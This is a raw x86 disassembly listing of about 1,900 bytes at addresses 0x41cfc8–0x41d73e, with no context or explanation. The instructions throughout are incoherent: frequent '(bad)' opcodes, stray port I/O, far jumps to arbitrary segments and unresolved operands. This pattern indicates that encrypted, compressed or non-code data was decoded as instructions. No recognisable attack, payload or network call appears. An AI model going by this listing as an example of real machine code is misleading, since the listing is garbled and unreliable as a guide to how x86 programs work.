  41cfc8:	mov    ah,0xa8
  41cfca:	mov    ds:0x32c8ebc4,al
  41cfcf:	inc    eax
  41cfd0:	fcomp  QWORD PTR [ebx-0x244b0414]
  41cfd6:	push   eax
  41cfd7:	or     DWORD PTR [ebp+0xcd6a267],esi
  41cfdd:	mov    ds:0x4a48199a,eax
  41cfe2:	adc    BYTE PTR [esi-0x4527abe4],bl
  41cfe8:	(bad)  
  41cfe9:	adc    ah,BYTE PTR [esi]
  41cfeb:	push   esp
  41cfec:	cwde   
  41cfed:	cld    
  41cfee:	sti    
  41cfef:	test   al,0xe
  41cff1:	sub    BYTE PTR [ebx],al
  41cff3:	xor    bl,BYTE PTR [ecx-0x56c8cee7]
  41cff9:	xor    DWORD PTR [eax+0x63],ecx
  41cffc:	imul   DWORD PTR [esi-0x7a64f0b]
  41d002:	mov    WORD PTR [ebp-0xb73a812],fs
  41d008:	xor    edx,ebx
  41d00a:	jns    0x41d030
  41d00c:	xor    eax,0xaddcf16e
  41d011:	inc    eax
  41d012:	fnstcw WORD PTR [eax+0x63f8511b]
  41d018:	jnp    0x41d014
  41d01a:	das    
  41d01b:	(bad)  
  41d01c:	int    0xb6
  41d01e:	fwait
  41d01f:	repz rol BYTE PTR [ecx+ecx*4-0x58],cl
  41d024:	daa    
  41d025:	imul   ecx
  41d027:	mov    ecx,0x5df94179
  41d02c:	sbb    al,0x2
  41d02e:	and    BYTE PTR [eax+edi*8-0xdd28e06],cl
  41d035:	push   ebx
  41d036:	rcr    DWORD PTR [ecx+eiz*2+0xb1b1964],0xba
  41d03e:	pop    esp
  41d03f:	out    dx,al
  41d040:	dec    edi
  41d041:	loopne 0x41d073
  41d043:	xchg   esp,eax
  41d044:	leave  
  41d045:	push   edi
  41d046:	sub    eax,0x9c2db451
  41d04b:	mov    ?,esi
  41d04d:	bound  esp,QWORD PTR [edx+esi*1+0x6e70affe]
  41d054:	or     ch,BYTE PTR [ecx+ecx*4-0x64894c64]
  41d05b:	xor    dl,BYTE PTR [eax]
  41d05d:	repnz stc 
  41d05f:	out    0xb6,eax
  41d061:	add    DWORD PTR [ebx],eax
  41d063:	jg     0x41d006
  41d065:	les    ebp,FWORD PTR [ecx+0x5253fe]
  41d06b:	cmp    eax,ebp
  41d06d:	mov    ah,0xde
  41d06f:	pop    edi
  41d070:	mov    ds:0x1917d54b,al
  41d075:	daa    
  41d076:	mov    ds:0xb9cc4e37,al
  41d07b:	mov    ebp,0x27e3477f
  41d080:	test   eax,0x946adfaa
  41d085:	and    al,dh
  41d087:	dec    ebx
  41d088:	mov    ebp,0x3e5ed438
  41d08d:	nop
  41d08e:	cs xchg edx,eax
  41d090:	mov    bh,0x0
  41d092:	inc    ebx
  41d093:	or     ch,ch
  41d095:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41d097:	jae    0x41d054
  41d099:	cdq    
  41d09a:	push   edi
  41d09b:	ret    
  41d09c:	shl    ah,0xfa
  41d09f:	adc    ah,dl
  41d0a1:	mov    esp,0x223644b9
  41d0a6:	out    0x82,eax
  41d0a8:	jne    0x41d04c
  41d0aa:	adc    DWORD PTR [ecx-0x49],esi
  41d0ad:	mov    ds:0x15cbfa36,al
  41d0b2:	inc    esi
  41d0b3:	xor    BYTE PTR [ebx],ch
  41d0b5:	xor    al,0x70
  41d0b7:	dec    esp
  41d0b8:	ja     0x41d110
  41d0ba:	retf   0xd4a4
  41d0bd:	or     dl,cl
  41d0bf:	popa   
  41d0c0:	pushf  
  41d0c1:	or     esp,ebp
  41d0c3:	lock push esi
  41d0c5:	fstp   TBYTE PTR [ecx+edi*1+0x54bf48a7]
  41d0cc:	jl     0x41d080
  41d0ce:	fcomp  QWORD PTR [edi+0x6b]
  41d0d1:	sub    esp,DWORD PTR [edx]
  41d0d3:	leave  
  41d0d4:	dec    ebp
  41d0d5:	mov    DWORD PTR [esi],eax
  41d0d7:	daa    
  41d0d8:	stc    
  41d0d9:	std    
  41d0da:	dec    esp
  41d0db:	pushf  
  41d0dc:	retf   
  41d0dd:	mov    cl,0x29
  41d0df:	nop
  41d0e0:	leave  
  41d0e1:	inc    eax
  41d0e2:	pop    ebx
  41d0e3:	jg     0x41d0c8
  41d0e5:	push   ss
  41d0e6:	out    dx,eax
  41d0e7:	cli    
  41d0e8:	add    al,0x83
  41d0ea:	sub    DWORD PTR [ecx],ebx
  41d0ec:	in     al,dx
  41d0ed:	xor    al,0x93
  41d0ef:	jmp    0x15b6:0xef5aabbc
  41d0f6:	test   DWORD PTR [edx-0x6e],eax
  41d0f9:	inc    edx
  41d0fa:	shl    DWORD PTR [ebx-0x2ff466ce],1
  41d100:	dec    eax
  41d101:	(bad)  
  41d102:	mov    eax,0xfd3c53a5
  41d107:	sbb    eax,0xcd27d143
  41d10c:	adc    cl,BYTE PTR [eax-0x1d2ab9a3]
  41d112:	je     0x41d0c8
  41d114:	add    edx,ebp
  41d116:	sub    edi,DWORD PTR [ecx+ecx*4-0x57ec42a7]
  41d11d:	fnstsw WORD PTR [edi]
  41d11f:	adc    DWORD PTR [ebx-0x3b],esp
  41d122:	test   DWORD PTR [edx+0x35af7f4a],edi
  41d128:	mov    ch,BYTE PTR [esi-0x21a6e1c]
  41d12e:	nop
  41d12f:	and    DWORD PTR [edx],eax
  41d131:	(bad)  
  41d132:	jmp    0x909ea1f0
  41d137:	sub    cl,0x6b
  41d13a:	and    esp,DWORD PTR [ebx]
  41d13c:	bound  esp,QWORD PTR [edx]
  41d13e:	(bad)  
  41d13f:	dec    ecx
  41d140:	xchg   ebx,eax
  41d141:	ins    DWORD PTR es:[edi],dx
  41d142:	mov    ch,dl
  41d144:	mov    eax,ds:0xa6a3e3e6
  41d149:	jl     0x41d101
  41d14b:	pop    esp
  41d14c:	ror    BYTE PTR [ecx],1
  41d14e:	pop    edx
  41d14f:	mov    eax,0xfdb45d83
  41d154:	rcr    edi,cl
  41d156:	or     BYTE PTR [esi+0x7f380d9d],cl
  41d15c:	jne    0x41d15b
  41d15e:	sub    eax,0x41dc3930
  41d163:	mov    BYTE PTR [edi-0x371a7ee5],ah
  41d169:	lds    esp,FWORD PTR [ecx]
  41d16b:	nop
  41d16c:	mov    bl,0x74
  41d16e:	push   esp
  41d16f:	xchg   ecx,eax
  41d170:	repz std 
  41d172:	jns    0x41d116
  41d174:	mov    ds:0x5f981ae3,eax
  41d179:	and    BYTE PTR [ecx],ch
  41d17b:	xchg   ebp,eax
  41d17c:	xchg   esp,eax
  41d17d:	in     al,dx
  41d17e:	jp     0x41d1f1
  41d180:	and    eax,0xfe80f50a
  41d185:	cs mov esp,0xbc477be4
  41d18b:	push   ss
  41d18c:	jno    0x41d17a
  41d18e:	jno    0x41d12f
  41d190:	push   ss
  41d191:	jg     0x41d1ea
  41d193:	add    eax,0xa6c28247
  41d198:	(bad)  
  41d19a:	jns    0x41d139
  41d19c:	or     dh,BYTE PTR [esi+0x5d501fd2]
  41d1a2:	mov    ah,0x8d
  41d1a4:	pop    ecx
  41d1a5:	sbb    eax,0x3d7a9d08
  41d1aa:	push   ss
  41d1ab:	inc    ebp
  41d1ac:	aad    0x99
  41d1ae:	xor    ecx,DWORD PTR [ebp+0x71]
  41d1b1:	iret   
  41d1b2:	xchg   edi,eax
  41d1b3:	jnp    0x41d1c8
  41d1b5:	mov    dh,0x61
  41d1b7:	fsubr  QWORD PTR [esi]
  41d1b9:	pop    ebx
  41d1ba:	push   ss
  41d1bb:	push   edx
  41d1bc:	fistp  WORD PTR [edx+eiz*2-0x7d80e65]
  41d1c3:	fs icebp 
  41d1c5:	pop    ebx
  41d1c6:	mov    edx,0x4b630df7
  41d1cb:	dec    ecx
  41d1cc:	add    DWORD PTR [edi-0x52a7ef3f],esi
  41d1d2:	dec    ebx
  41d1d3:	push   esp
  41d1d4:	test   al,0x36
  41d1d6:	shl    dh,1
  41d1d8:	mov    ecx,0xa98a1b1d
  41d1dd:	and    ah,BYTE PTR [ebx]
  41d1df:	mov    esp,cs
  41d1e1:	pop    es
  41d1e2:	add    BYTE PTR [edx],dl
  41d1e4:	stos   BYTE PTR es:[edi],al
  41d1e5:	out    0x88,al
  41d1e7:	pop    edx
  41d1e8:	sahf   
  41d1e9:	not    BYTE PTR [edi]
  41d1eb:	test   DWORD PTR [eax],ebp
  41d1ed:	mov    esi,0xde6b91c
  41d1f2:	arpl   WORD PTR [eax+0x27],bp
  41d1f5:	jno    0x41d238
  41d1f7:	sbb    DWORD PTR [esi+edi*1-0x1c],ebx
  41d1fb:	mov    ch,0x88
  41d1fd:	test   DWORD PTR [esi+0x57],edi
  41d200:	sub    eax,ebx
  41d202:	or     DWORD PTR [ecx],esp
  41d204:	push   ds
  41d205:	dec    esi
  41d206:	and    ch,BYTE PTR [edi+0x588c684c]
  41d20c:	sbb    edi,DWORD PTR [esi+0x6c8d20a1]
  41d212:	ds repz push 0xfffffff1
  41d216:	out    dx,eax
  41d217:	dec    ecx
  41d218:	jecxz  0x41d1e2
  41d21a:	outs   dx,DWORD PTR ds:[esi]
  41d21b:	jle    0x41d1bc
  41d21d:	cmovns ecx,DWORD PTR [ebx]
  41d220:	sub    eax,0x412f2b26
  41d225:	(bad)  
  41d226:	pop    ecx
  41d227:	sahf   
  41d228:	xor    al,0x2a
  41d22a:	das    
  41d22b:	mov    ds:0xebfaffae,al
  41d230:	xchg   esi,eax
  41d231:	(bad)  
  41d232:	or     cl,ah
  41d234:	dec    BYTE PTR [ecx]
  41d236:	dec    edx
  41d237:	cmp    eax,DWORD PTR [eax+ebp*2]
  41d23a:	int    0x83
  41d23c:	or     al,0x28
  41d23e:	test   al,0xf6
  41d240:	push   ss
  41d241:	in     al,0xa9
  41d243:	jns    0x41d29e
  41d245:	or     esp,DWORD PTR [ecx]
  41d247:	jp     0x41d1d8
  41d249:	repnz push 0x1a
  41d24c:	aaa    
  41d24d:	mov    edi,0x7ce34851
  41d252:	repz or al,0xd5
  41d255:	jne    0x41d2d3
  41d257:	cmp    al,0x39
  41d259:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d25a:	mov    edi,0xf4307dfd
  41d25f:	cmp    DWORD PTR ds:0x662fe1c3,ebx
  41d265:	lods   eax,DWORD PTR es:[esi]
  41d267:	inc    ecx
  41d268:	outs   dx,BYTE PTR ds:[esi]
  41d269:	inc    ebp
  41d26a:	mov    ch,0xa5
  41d26c:	cdq    
  41d26d:	pop    edi
  41d26e:	cmc    
  41d26f:	(bad)  
  41d271:	lods   eax,DWORD PTR ds:[esi]
  41d272:	adc    BYTE PTR [eax+edx*2-0x54],cl
  41d276:	jmp    0xe76eaa51
  41d27b:	shr    BYTE PTR [edx],cl
  41d27d:	mov    edi,0x58a906e0
  41d282:	ret    
  41d283:	push   eax
  41d284:	push   esp
  41d285:	sbb    eax,0x3bcef1d8
  41d28a:	std    
  41d28b:	jno    0x41d2bd
  41d28d:	mov    esp,0xb3b65ee3
  41d292:	mov    ecx,0xa225cc76
  41d297:	repz fst QWORD PTR [ecx]
  41d29a:	adc    edx,edi
  41d29c:	dec    esp
  41d29d:	jmp    0x8d53:0x186bb402
  41d2a4:	jp     0x41d2b0
  41d2a6:	mov    ecx,0xaa14710b
  41d2ab:	pop    edx
  41d2ac:	fist   DWORD PTR [ecx+0x2f]
  41d2af:	mov    ebp,0x8aad2dce
  41d2b4:	xchg   ebx,eax
  41d2b5:	pop    eax
  41d2b6:	or     BYTE PTR [edx+0x2a],0xae
  41d2ba:	mov    bh,0x84
  41d2bc:	sub    DWORD PTR [eax-0x69],ebp
  41d2bf:	in     eax,0xc2
  41d2c1:	or     BYTE PTR [ebx+eiz*4],bh
  41d2c4:	cwde   
  41d2c5:	rcl    al,cl
  41d2c7:	or     al,0xd8
  41d2c9:	cmp    eax,0x884956b2
  41d2ce:	hlt    
  41d2cf:	xchg   edi,eax
  41d2d0:	stos   DWORD PTR es:[edi],eax
  41d2d1:	loope  0x41d31f
  41d2d3:	sbb    cl,BYTE PTR [esi+0x3c]
  41d2d6:	in     eax,dx
  41d2d7:	clc    
  41d2d8:	sbb    al,0xd3
  41d2da:	pop    edx
  41d2db:	or     eax,0xe7655d5b
  41d2e0:	mov    ds:0x3b749293,al
  41d2e5:	out    0x77,eax
  41d2e7:	cdq    
  41d2e8:	inc    ecx
  41d2e9:	dec    DWORD PTR [edi+0x6a30b187]
  41d2ef:	fst    QWORD PTR [esi+0x9]
  41d2f2:	mov    eax,ds:0xae8d01b4
  41d2f7:	stos   DWORD PTR es:[edi],eax
  41d2f8:	gs jle 0x41d333
  41d2fb:	aaa    
  41d2fc:	shl    dh,0x2d
  41d2ff:	or     al,0x86
  41d301:	xchg   ecx,eax
  41d302:	jmp    0x19e5:0x2e5dfb71
  41d309:	mov    ?,WORD PTR [edx]
  41d30b:	lods   eax,DWORD PTR ds:[si]
  41d30d:	or     ch,BYTE PTR [edi+eiz*4-0x3d]
  41d311:	pusha  
  41d312:	out    dx,eax
  41d313:	sub    esp,DWORD PTR [eax-0x51]
  41d316:	repnz sahf 
  41d318:	or     BYTE PTR [ebx+ecx*1],al
  41d31b:	jg     0x41d32d
  41d31d:	imul   eax,DWORD PTR [eax-0x2b03e971],0x93c6b2bd
  41d327:	sbb    cl,BYTE PTR [esi-0x259fb0f6]
  41d32d:	adc    ecx,ebp
  41d32f:	inc    esp
  41d330:	repnz xor al,0x35
  41d333:	and    al,0x69
  41d335:	or     al,bl
  41d337:	push   ebp
  41d338:	ins    BYTE PTR es:[edi],dx
  41d339:	xchg   BYTE PTR [edi+esi*8-0x13],cl
  41d33d:	shr    BYTE PTR [ebx-0x4a],cl
  41d340:	and    BYTE PTR [edi],dl
  41d342:	mov    eax,0xd6338d51
  41d347:	rol    BYTE PTR [ebx],0x1e
  41d34a:	xlat   BYTE PTR ds:[ebx]
  41d34b:	cs int3 
  41d34d:	repnz clc 
  41d34f:	or     eax,DWORD PTR [esi+0x56dae127]
  41d355:	aaa    
  41d356:	pop    ecx
  41d357:	fsubr  QWORD PTR [ecx]
  41d359:	cmp    edi,DWORD PTR [eax-0x7ad798e]
  41d35f:	imul   ebx,DWORD PTR [edx+0x3efc415c],0xdfc5c251
  41d369:	push   eax
  41d36a:	fild   QWORD PTR [ecx]
  41d36c:	popa   
  41d36d:	xor    eax,0xbabc11d7
  41d372:	inc    ebx
  41d373:	xor    BYTE PTR [esi+ebp*2-0x39018f33],dl
  41d37a:	(bad)  
  41d37b:	or     BYTE PTR [edi+0x6e],bh
  41d37e:	adc    dl,ch
  41d380:	xchg   esp,eax
  41d381:	fs pop eax
  41d383:	pop    ds
  41d384:	pop    edi
  41d385:	aam    0x3c
  41d387:	out    dx,al
  41d388:	jnp    0x41d396
  41d38a:	jo     0x41d338
  41d38c:	sub    al,0x2f
  41d38e:	jmp    0xcb87:0x9b73f40e
  41d395:	xchg   ah,cl
  41d397:	push   0x6b
  41d399:	or     dl,cl
  41d39b:	mov    al,BYTE PTR [esi-0x3821d679]
  41d3a1:	ror    DWORD PTR [eax],0xdd
  41d3a4:	lea    ebp,[eax+0x79100f58]
  41d3aa:	scas   al,BYTE PTR es:[edi]
  41d3ab:	xchg   esi,eax
  41d3ac:	int    0x16
  41d3ae:	xor    DWORD PTR [esi],ebp
  41d3b0:	adc    BYTE PTR [ebp-0x23d86350],ah
  41d3b6:	repz scas eax,DWORD PTR es:[edi]
  41d3b8:	mov    DWORD PTR [esp+eiz*4-0x3aa64fb7],ebx
  41d3bf:	mov    ebp,DWORD PTR [ecx]
  41d3c1:	fs xchg ebp,eax
  41d3c3:	xchg   bh,ah
  41d3c5:	and    ecx,ebp
  41d3c7:	(bad)  [edi+0x2edb887f]
  41d3cd:	sbb    DWORD PTR [esp+esi*2],0x7ad7df7d
  41d3d4:	aad    0x73
  41d3d6:	cmp    DWORD PTR [esi-0x13],eax
  41d3d9:	jmp    0x605d9a6c
  41d3de:	fdivr  DWORD PTR es:[ebp-0x71]
  41d3e2:	test   BYTE PTR [esi],cl
  41d3e4:	pop    es
  41d3e5:	add    al,0x75
  41d3e7:	sbb    eax,0xee3fe03e
  41d3ec:	inc    ax
  41d3ee:	xchg   ebp,eax
  41d3ef:	or     ecx,ebx
  41d3f1:	sar    esi,0x36
  41d3f4:	sbb    al,0x61
  41d3f6:	ins    BYTE PTR es:[edi],dx
  41d3f7:	(bad)  
  41d3f8:	jmp    0x41d3f4
  41d3fa:	ins    BYTE PTR es:[edi],dx
  41d3fb:	ins    BYTE PTR es:[edi],dx
  41d3fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3fd:	pop    eax
  41d3fe:	xor    DWORD PTR [edi],ebp
  41d400:	adc    BYTE PTR [esi],0xe2
  41d403:	xor    DWORD PTR [ecx],eax
  41d405:	pop    ebx
  41d406:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d407:	sahf   
  41d408:	fcomi  st,st(3)
  41d40a:	outs   dx,DWORD PTR ds:[esi]
  41d40b:	mov    edi,0x88e6b979
  41d410:	fcomp  DWORD PTR [ecx-0x32e6fc25]
  41d416:	pop    edx
  41d417:	mov    ch,0x95
  41d419:	jl     0x41d44e
  41d41b:	sub    al,0x2c
  41d41d:	ret    
  41d41e:	pop    edi
  41d41f:	jnp    0x41d406
  41d421:	mov    ah,0x26
  41d423:	cmp    al,0x84
  41d425:	cmp    BYTE PTR [ebx+esi*4-0x53],0xbd
  41d42a:	test   BYTE PTR [ebp+eiz*2-0x31],ah
  41d42e:	xchg   edi,eax
  41d42f:	pop    esp
  41d430:	(bad)  [ecx+0x32c58f43]
  41d436:	mov    bl,0xe0
  41d438:	shl    BYTE PTR [edi],1
  41d43a:	fist   DWORD PTR [eax]
  41d43c:	fcmovnu st,st(7)
  41d43e:	sub    DWORD PTR [esi-0x5e],ebp
  41d441:	mov    ch,0xbc
  41d443:	cwde   
  41d444:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d445:	out    dx,al
  41d446:	fstp   TBYTE PTR [eax+0x0]
  41d449:	call   0xf4a2:0x29d56b87
  41d450:	lods   eax,DWORD PTR ds:[esi]
  41d451:	jnp    0x41d44f
  41d453:	js     0x41d491
  41d455:	inc    ebp
  41d456:	add    edi,DWORD PTR [ebp-0x3a185b9d]
  41d45c:	mov    DWORD PTR [ebx],edx
  41d45e:	mov    edx,0xc0c6ddae
  41d463:	pop    ecx
  41d464:	inc    ebx
  41d465:	xlat   BYTE PTR ds:[ebx]
  41d466:	push   0xffffff9f
  41d468:	cmp    DWORD PTR [eax+0x53],esi
  41d46b:	xchg   ebp,eax
  41d46c:	mov    dh,0x37
  41d46e:	ds clc 
  41d470:	hlt    
  41d471:	sahf   
  41d472:	mov    dh,0x10
  41d474:	push   cs
  41d475:	cdq    
  41d476:	ins    DWORD PTR es:[edi],dx
  41d477:	cmp    BYTE PTR [esp+eax*4-0x28],al
  41d47b:	scas   eax,DWORD PTR es:[edi]
  41d47c:	add    ebx,edx
  41d47e:	ds aaa 
  41d480:	pop    ebx
  41d481:	cmp    BYTE PTR [ecx-0x71ec5481],dl
  41d487:	inc    eax
  41d488:	call   0xf3db:0xae9fcabb
  41d48f:	stos   BYTE PTR es:[edi],al
  41d490:	xor    DWORD PTR [edx-0x5f],edi
  41d493:	fisttp DWORD PTR [ecx+0x6c4554f1]
  41d499:	pop    esi
  41d49a:	sub    BYTE PTR [edi],bh
  41d49c:	mov    edi,0x43f63bfe
  41d4a1:	repz jo 0x41d472
  41d4a4:	and    BYTE PTR [edi-0x36],0x3a
  41d4a8:	jge    0x41d480
  41d4aa:	xlat   BYTE PTR ds:[ebx]
  41d4ab:	push   esp
  41d4ac:	xchg   DWORD PTR [ebx-0x43],esp
  41d4af:	adc    BYTE PTR [edx+0x41027cd3],cl
  41d4b5:	fs ror eax,cl
  41d4b8:	icebp  
  41d4b9:	call   0x1734:0xc8e6fede
  41d4c0:	ins    DWORD PTR es:[edi],dx
  41d4c1:	and    BYTE PTR [esi+eiz*4],al
  41d4c4:	rcr    DWORD PTR [ebx+0x11090282],1
  41d4ca:	cmp    DWORD PTR [ebp-0x4a],esi
  41d4cd:	cmp    BYTE PTR [edx+0x3c9b18ce],cl
  41d4d3:	mov    dh,0xb
  41d4d5:	push   0x6472a2f0
  41d4da:	or     ch,BYTE PTR [edi-0x25dd5d66]
  41d4e0:	mov    esi,DWORD PTR [eax-0x77bce87d]
  41d4e6:	jl     0x41d498
  41d4e8:	jb     0x41d51c
  41d4ea:	or     bh,BYTE PTR [ebp+ecx*8-0x30d352da]
  41d4f1:	sbb    al,ah
  41d4f3:	xlat   BYTE PTR ds:[ebx]
  41d4f4:	jmp    0x98590e04
  41d4f9:	mov    edx,0xee4f7da2
  41d4fe:	(bad)  
  41d4ff:	popf   
  41d500:	cmp    BYTE PTR [edi],dh
  41d502:	lea    ebx,[ecx+0x6323ee46]
  41d508:	jp     0x41d543
  41d50a:	jecxz  0x41d524
  41d50c:	mov    dh,BYTE PTR [esi-0x2]
  41d50f:	fiadd  DWORD PTR [ecx-0x5a]
  41d512:	adc    DWORD PTR [edi+0x504260d7],eax
  41d518:	aam    0x9a
  41d51a:	xor    al,0x90
  41d51c:	jp     0x41d571
  41d51e:	mov    ecx,0x4edd67b6
  41d523:	pop    ecx
  41d524:	data16 aaa 
  41d526:	jne    0x41d50f
  41d528:	mov    bl,0xe0
  41d52a:	jg     0x41d50b
  41d52c:	pushf  
  41d52d:	dec    esp
  41d52e:	std    
  41d52f:	imul   ebx,edx,0x3a
  41d532:	out    dx,al
  41d533:	mov    bl,0x2
  41d535:	jb     0x41d4e1
  41d537:	popa   
  41d538:	sti    
  41d539:	mov    esi,0x2dcfa093
  41d53e:	add    al,0xb6
  41d540:	mov    dl,0xd6
  41d542:	inc    esp
  41d543:	(bad)  
  41d545:	js     0x41d526
  41d547:	cmp    al,0xa5
  41d549:	fsub   DWORD PTR [eax+0x7]
  41d54c:	xchg   ecx,eax
  41d54d:	gs icebp 
  41d54f:	mov    eax,ds:0x6e4eb6c6
  41d554:	xchg   ebp,eax
  41d555:	js     0x41d54c
  41d557:	jno    0x41d548
  41d559:	xchg   ecx,eax
  41d55a:	mov    esp,0xdc98d419
  41d55f:	iret   
  41d560:	cmp    ebp,DWORD PTR [esi+eax*1+0x37]
  41d564:	aam    0xae
  41d566:	xor    BYTE PTR [edi+eiz*4+0x1f0d4517],dl
  41d56d:	mov    ch,0x64
  41d56f:	mov    WORD PTR [eax+0x70],cs
  41d572:	push   ecx
  41d573:	dec    eax
  41d574:	cdq    
  41d575:	jg     0x41d5f2
  41d577:	xchg   ebp,eax
  41d578:	xchg   esp,eax
  41d579:	cmp    BYTE PTR [ebx+ecx*1],bl
  41d57c:	nop
  41d57d:	sahf   
  41d57e:	dec    ebx
  41d57f:	icebp  
  41d580:	js     0x41d505
  41d582:	xchg   ecx,eax
  41d583:	inc    eax
  41d584:	or     ecx,DWORD PTR [edi-0x6598a28b]
  41d58a:	xor    al,0xb7
  41d58c:	xor    eax,0xdf71aa4a
  41d591:	ret    
  41d592:	sbb    al,0x9d
  41d594:	sbb    al,dl
  41d596:	dec    DWORD PTR [ecx]
  41d598:	mov    ebx,0xe36df0c3
  41d59d:	in     al,dx
  41d59e:	scas   al,BYTE PTR es:[edi]
  41d59f:	or     eax,0xf18e4d63
  41d5a4:	cmp    BYTE PTR [eax],ah
  41d5a6:	adc    BYTE PTR [edx+0x22d22971],cl
  41d5ac:	jle    0x41d5bb
  41d5ae:	xchg   esp,eax
  41d5af:	dec    eax
  41d5b0:	cmp    BYTE PTR [edx],bl
  41d5b2:	or     edx,edi
  41d5b4:	aad    0x83
  41d5b6:	retf   0x995a
  41d5b9:	xor    esp,ebx
  41d5bb:	popf   
  41d5bc:	vcmpnle_uqss xmm5,xmm0,DWORD PTR [edx-0x648d2efd]
  41d5c5:	jecxz  0x41d612
  41d5c7:	sub    cl,BYTE PTR [edi+0x54]
  41d5ca:	fadd   QWORD PTR [esi+esi*4-0x70]
  41d5ce:	mov    al,0x28
  41d5d0:	xchg   edx,eax
  41d5d1:	fbld   TBYTE PTR [edx+0x32]
  41d5d4:	xchg   esp,eax
  41d5d5:	mov    edx,0xfc0be874
  41d5da:	or     BYTE PTR [edi],al
  41d5dc:	ret    
  41d5dd:	ficom  WORD PTR [esi+0x35]
  41d5e0:	and    al,dl
  41d5e2:	(bad)  
  41d5e3:	stos   BYTE PTR es:[edi],al
  41d5e4:	and    al,0xa7
  41d5e6:	or     DWORD PTR [ebp-0x1f],edi
  41d5e9:	enter  0xd0d6,0x14
  41d5ed:	or     BYTE PTR [ebx-0x16],bh
  41d5f0:	mov    ds:0x6986dc7,al
  41d5f5:	in     eax,dx
  41d5f6:	pop    ebx
  41d5f7:	or     edx,DWORD PTR [edi]
  41d5f9:	pusha  
  41d5fa:	out    dx,eax
  41d5fb:	sbb    DWORD PTR [ebp+0x26937791],esi
  41d601:	in     eax,0x9b
  41d603:	aam    0xfe
  41d605:	mov    esi,0x9cc0df99
  41d60a:	mov    esi,0x537bd4f2
  41d60f:	xor    BYTE PTR [eax],ch
  41d611:	lock fwait
  41d613:	in     al,0xa0
  41d615:	ror    al,cl
  41d617:	sub    BYTE PTR [ebx-0x61de568c],bh
  41d61d:	and    DWORD PTR [edi-0x3f],0xffffff84
  41d621:	pop    esp
  41d622:	and    dh,dl
  41d624:	mov    DWORD PTR [edx],esp
  41d626:	test   DWORD PTR [eax],ecx
  41d628:	ror    bh,1
  41d62a:	pop    esi
  41d62b:	idiv   DWORD PTR [ecx-0x25]
  41d62e:	push   esp
  41d62f:	push   0xb
  41d631:	cmp    BYTE PTR [edx+0x7d],ch
  41d634:	cld    
  41d635:	mov    ds:0x26cbdb36,al
  41d63a:	push   ecx
  41d63b:	icebp  
  41d63c:	(bad)  [ecx]
  41d63e:	and    al,BYTE PTR ds:0xc366ba3d
  41d644:	adc    ah,BYTE PTR [edx-0x53]
  41d647:	lds    ebx,FWORD PTR [ebx+0x63]
  41d64a:	into   
  41d64b:	xchg   edi,eax
  41d64c:	clc    
  41d64d:	jnp    0x41d6ac
  41d64f:	dec    eax
  41d650:	or     BYTE PTR [esi],bh
  41d652:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d653:	jmp    0x9aa224bf
  41d658:	into   
  41d659:	pop    ebx
  41d65a:	mov    WORD PTR [eax+0x24a0043],ss
  41d660:	inc    edx
  41d661:	xchg   esp,eax
  41d662:	daa    
  41d663:	mov    cl,0x87
  41d665:	pop    ecx
  41d666:	test   al,0x53
  41d668:	adc    al,0x2e
  41d66a:	adc    al,0xa0
  41d66c:	call   0x1853:0x2de31e9f
  41d673:	cmp    eax,0xe8e5cd5c
  41d678:	cmp    esp,DWORD PTR [eax]
  41d67a:	imul   esp,DWORD PTR [ebp+eax*4+0x40],0x960b3d2b
  41d682:	cmp    DWORD PTR [ebx-0x63],0x3c247aec
  41d689:	mov    dl,0xce
  41d68b:	enter  0x3f7,0x22
  41d68f:	xor    eax,0xcaa3048f
  41d694:	lods   eax,DWORD PTR ds:[esi]
  41d695:	inc    esp
  41d696:	lock fcom QWORD PTR [edx*8-0x4aba2c83]
  41d69e:	sub    BYTE PTR [edx+0x475c132f],ch
  41d6a4:	add    eax,esp
  41d6a6:	ja     0x41d6f2
  41d6a8:	scas   eax,DWORD PTR es:[edi]
  41d6a9:	arpl   bp,di
  41d6ab:	and    esp,esp
  41d6ad:	mov    bh,0xbb
  41d6af:	lea    edi,[edx+0x66]
  41d6b2:	and    eax,0xe53a30c4
  41d6b7:	popf   
  41d6b8:	push   esi
  41d6b9:	jne    0x41d69b
  41d6bb:	(bad)  
  41d6bc:	mov    ch,0x2f
  41d6be:	aad    0xb9
  41d6c0:	hlt    
  41d6c1:	and    al,0x8f
  41d6c3:	(bad)
  41d6c7:	or     BYTE PTR [edx+0x63],bl
  41d6ca:	xchg   esp,eax
  41d6cb:	in     al,0xb7
  41d6cd:	xchg   esp,eax
  41d6ce:	pop    ss
  41d6cf:	jne    0x41d74a
  41d6d1:	pop    ss
  41d6d2:	lock or BYTE PTR [edi+0x62af791f],0xac
  41d6da:	out    dx,eax
  41d6db:	push   cs
  41d6dc:	outs   dx,DWORD PTR ds:[esi]
  41d6dd:	out    dx,eax
  41d6de:	xchg   edi,eax
  41d6df:	push   ss
  41d6e0:	jnp    0x41d6b0
  41d6e2:	and    al,0x38
  41d6e4:	sbb    ah,BYTE PTR [esi-0xa]
  41d6e7:	mov    esp,0x996f1987
  41d6ec:	or     al,BYTE PTR [eax+0x31b53ef6]
  41d6f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d6f3:	pop    ebp
  41d6f4:	sbb    bh,BYTE PTR [ebp+0xab18bc3]
  41d6fa:	cmp    BYTE PTR [ecx-0x20f11c11],dl
  41d700:	or     BYTE PTR [edx],dh
  41d702:	repnz into 
  41d704:	(bad)  
  41d705:	jb     0x41d779
  41d707:	popfw  
  41d709:	mov    ecx,0xb8f2bfe7
  41d70e:	mov    bh,0xba
  41d710:	push   ds
  41d711:	test   DWORD PTR [esi+0x11fa6de7],edx
  41d717:	adc    BYTE PTR [ebp+0x6a83a1ed],dh
  41d71d:	cdq    
  41d71e:	mov    ebp,DWORD PTR [eax-0x149219f1]
  41d724:	dec    edx
  41d725:	dec    edi
  41d726:	dec    esp
  41d727:	pop    ebx
  41d728:	sub    dh,BYTE PTR [edx+0xee5cde]
  41d72e:	or     ebp,esi
  41d730:	(bad)  
  41d731:	cmp    ch,BYTE PTR [eiz*1+0x1bde25ee]
  41d738:	(bad)  
  41d739:	loopne 0x41d729
  41d73b:	adc    al,0x9c
  41d73d:	pop    ds
  41d73e:	mov    al,ds:0xe265ccdd
